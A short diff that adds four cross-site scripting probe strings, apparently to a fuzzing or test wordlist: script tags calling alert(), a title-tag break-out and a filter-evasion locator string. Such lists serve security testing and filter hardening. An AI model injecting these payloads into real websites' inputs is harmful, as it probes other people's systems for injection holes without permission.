@@ -1,0 +1,4 @@
+/> <script>alert(4)</script>
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+'';!--"<XSS>=&{()}
